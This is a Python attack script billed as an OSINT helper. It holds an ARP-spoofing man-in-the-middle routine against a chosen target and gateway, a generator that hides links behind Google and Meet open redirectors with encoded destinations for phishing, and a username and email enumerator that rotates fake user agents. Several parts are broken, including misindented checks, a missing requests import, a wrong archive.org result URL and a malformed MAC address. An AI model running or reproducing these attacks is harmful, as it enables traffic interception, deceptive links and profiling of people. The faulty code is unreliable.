
# This is part from OHT (OSINT Helper Tool)Tool

import os,sys

oscheck1 = os.system('cls') # Check Platform
if oscheck1==0:
    cpt = True
else:
    cpt =  False
    _=os.system('clear')

# Import Packages
import random,argparse
from colorama import Fore
from scapy.all import *

# Import Arguments
arg = argparse.ArgumentParser()
arg.add_argument("--mitm",help='Man in the middle attacks',action='store_true',dest='mimt',default=False,required=False)
arg.add_argument("--vur",help='Vulnerable url redirector',action='store_true',dest='vur',default=False,required=False)
arg.add_argument("--fsa",help='Finding account with the same name',action='store_true',dest='fsa',default=False,required=False)
arg = arg.parse_args()

# Check
if not arg.mimt:
    if not arg.vur:
        if not cpt:
                sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Please select an attack')
            else:
                sys.exit('[ERR] Please select an attack')
    if arg.fsa:
        if not cpt:
                sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Please select an attack')
            else:
                sys.exit('[ERR] Please select an attack')

if arg.vur:
    if arg.mimt:
        if not cpt:
                sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Please select an attack')
            else:
                sys.exit('[ERR] Please select an attack')
    if arg.fsa:
        if not cpt:
                sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Please select an attack')
            else:
                sys.exit('[ERR] Please select an attack')

# Preparing
token = ['Q','w','E','r','T','y','U','i','O','p','A','s','D','f','G','h','J','k','L','z','X','c','V','b','N','m','q','W','e','R','t','Y','u','I','o','P','a','S','d','F','g','H','j','K','l','Z','x','C','v','B','n','M','1','0','2','9','3','8','4','7','5','6']
ifcs = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
keys = ['%61','%62','%63','%64','%65','%66','%67','%68','%69','%6A','%6B','%6C','%6D','%6E','%6F','%70','%71','%72','%73','%74','%75','%76','%77','%78','%79','%7A']

vulhurl = [
    'https://asia.google.com/search?btnI&tokens=TOKEN_HERE&q=',
    'http://blogsearch.google.com/search?btnI&tokens=TOKEN_HERE&q=',
    'http://clients1.google.com/search?btnI&tokens=TOKEN_HERE&q=',
    'http://images.google.com/search?btnI&tokens=TOKEN_HERE&q=',
    'http://mail.google.com/search?btnI&tokens=TOKEN_HERE&q=',
    'http://map.google.com/search?btnI&tokens=TOKEN_HERE&q=',
    'http://www.google.com/search?btnI&tokens=TOKEN_HERE&q=',
    'https://meet.google.com/linkredirect?tokens=TOKEN_HERE&dest='
    ]

def encrypt(a):
    for key in range(len(keys)):
        a = a.replace(ifcs[key],keys[key])
    return a

def UARand():
    base = 'Mozilla /5.0 ('
    plt = ['Linux; ','Windows NT ','Macintosh; Intel Mac OS X ','X11; '][random.randint(0,3)]
    base += plt
    if plt=='Linux; ':
        osp = ['U; ','Android '][random.randint(0,1)]
        if osp=='Android ':
            osp += ['4.','5.'][random.randint(0,1)]+['0.','2.','4.'][random.randint(0,2)]+str(random.randint(1,4))
        elif osp=='U; ':
            osp += 'Android '+['4.','5.'][random.randint(0,1)]+['0.','2.','4.'][random.randint(0,2)]+str(random.randint(1,4))
        base+=osp+')'
    elif plt=='Windows NT ':
        osp = str(random.randint(5,10))+'.'
        if not osp=='10':
            str(random.randint(1,3))
        
        if random.randint(1,2)==2:
            osp += '; WOW64'
            if random.randint(1,2)==2:
                osp += '; Trident/7.0; rv:11.0'
        else:
            osp += '; Win64; x64'
        base += osp+')'
    elif plt=='Macintosh; Intel Mac OS X ':
        base += '10_'+str(random.randint(6,10))+'_'+str(random.randint(2,5))+')'
    elif plt=='X11; ':
        osp = ['CrOS x86_64 ','Ubuntu; ','U; ','Linux i686','Linux x86_64'][random.randint(0,4)]+')'
        if osp=='CrOS x86_64 ':
            osp += str(random.randint(6500,7077))+'.'+str(random.randint(52,134))+'.0)'
            base += osp
        elif osp=='Ubuntu; ':
            osp += ['Linux i686','Linux x86_64'][random.randint(0,1)]
            if random.randint(1,2)==2:
                osp += '; rv:'+str(random.randint(33,40))+'.0'
        elif osp=='U; ':
            osp += ['Linux i686','Linux x86_64'][random.randint(0,1)]+', en-US'
        base += osp
    ie = [' Gecko/20100101',' AppleWebKit/537.36 (KHTML, like Gecko)'][random.randint(0,1)]
    if ie==' AppleWebKit/537.36 (KHTML, like Gecko)':
        ie += ' Chrome/'+str(random.randint(31,91))+'.0.'+str(random.randint(1650,4472))+'.'+str(random.randint(0,95))+' Safari/537.36'
    elif ie==' Gecko/20100101':
        ie += ' Firefox/'+str(random.randint(29,40))
    base += ie
    return base

def randToken():
    a = random.randint(75,80)
    b = []
    e = ''
    for i in range(a):
        c = random.randrange(len(token))
        b.append(token[c])
    for i in range(0,len(b)):
        e = e+b[i]
    return e

def afind(an):
    fap = ['ig','git','twch','twt','arcv','blg','strm','chs','yho','gml','wml']
    if requests.get('https://www.instagram.com/'+an,headers={'User-Agent': UARand()}).status_code == 200: ig = 'https://www.instagram.com/'+an
    else: ig = None
    if requests.get('https://github.com/'+an,headers={'User-Agent': UARand()}).status_code == 200: git = 'https://github.com/'+an
    else: git = None
    if requests.get('https://www.twitch.tv/'+an,headers={'User-Agent': UARand()}).status_code == 200: twch = 'https://www.twitch.tv/'+an
    else: twch = None
    if requests.get('https://twitter.com/'+an,headers={'User-Agent': UARand()}).status_code == 200: twt = 'https://twitter.com/'+an
    else: twt = None
    if requests.get('https://archive.org/details/@'+an.lower(),headers={'User-Agent': UARand()}).status_code == 200: arcv = 'https://twitter.com/'+an
    else: arcv = None
    if requests.get('https://'+an.lower()+'.blogspot.com',headers={'User-Agent': UARand()}).status_code == 200: blg = 'https://'+an.lower()+'.blogspot.com'
    else: blg = None
    if requests.get('https://streamlabs.com/'+an.lower(),headers={'User-Agent': UARand()}).status_code == 200: strm = 'https://streamlabs.com/'+an.lower()
    else: strm = None
    if requests.get('https://www.chess.com/member/'+an.lower(),headers={'User-Agent': UARand()}).status_code == 200: chs = 'https://www.chess.com/member/'+an.lower()
    else: chs = None
    if requests.get('https://isitarealemail.com/api/email/validate',params={'email': an+'@yahoo.com'}).json()['status'] == 'valid': yho = an+'@yahoo.com'
    else: yho = None
    if requests.get('https://isitarealemail.com/api/email/validate',params={'email': an+'@gmail.com'}).json()['status'] == 'valid': gml = an+'@gmail.com'
    else: gml = None
    if requests.get('https://isitarealemail.com/api/email/validate',params={'email': an+'@mail.com'}).json()['status'] == 'valid': wml = an+'@mail.com'
    else: wml = None
    if not cpt:
        print('['+Fore.GREEN+'INF'+Fore.RESET+'] Found :')
    else:
        print('[INF] Found :')
    for p in fap:
        exec('if '+p+' != None: print(\'    \'+'+p+')')

def restore():
    print('Restoring...')
    send(ARP(op=2, pdst=gatewayIP, psrc=targetIP, hwdst = 'ff:ff:ff:ff:ff', hwsrc=targetMAC),count=10,verbose=False)
    send(ARP(op=2, pdst=targetIP, psrc=gatewayIP, hwdst = 'ff:ff:ff:ff:ff', hwsrc=gatewayMAC),count=10,verbose=False)
    sys.exit()

def mitm():
    send(ARP(op=2, pdst=targetIP, psrc=gatewayIP, hwdst = targetMAC),verbose=False)
    send(ARP(op=2, pdst=gatewayIP, psrc=targetIP, hwdst = gatewayMAC),verbose=False)

if arg.mimt:
    targetIP = input('Target IP : ')
    gatewayIP = input('Gateway IP : ')
    targetMAC = getmacbyip(targetIP)
    gatewayMAC = getmacbyip(gatewayIP)
    try:
        while True:
            mitm()
            time.sleep(2.5)
    except KeyboardInterrupt:
        restore()

elif arg.vur:
    print('''
Option :

[1] https://asia.google.com/search?btnI&tokens=TOKEN_HERE&q={}
[2] http://blogsearch.google.com/search?btnI&tokens=TOKEN_HERE&q={}
[3] http://clients1.google.com/search?btnI&tokens=TOKEN_HERE&q={}
[4] http://images.google.com/search?btnI&tokens=TOKEN_HERE&q={}
[5] http://mail.google.com/search?btnI&tokens=TOKEN_HERE&q={}
[6] http://map.google.com/search?btnI&tokens=TOKEN_HERE&q={}
[7] http://www.google.com/search?btnI&tokens=TOKEN_HERE&q={}
[8] https://meet.google.com/linkredirect?tokens=TOKEN_HERE&dest={}    
''')
    opt = int(input('Option : '))
    if opt > len(vulhurl):
        if not cpt:
            sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Unknown Option')
        else:
            sys.exit('[ERR] Unknown Option')
    url = input('URL :')
    url = (vulhurl[opt-1]+encrypt(url)).replace('TOKEN_HERE', randToken())
    if not cpt:
        print('['+Fore.GREEN+'INF'+Fore.RESET+'] Output : '+url)
    else:
        print('[INF] Output : '+url)

elif arg.fsa:
    acn = input('Account Name : ')
    afind(acn)
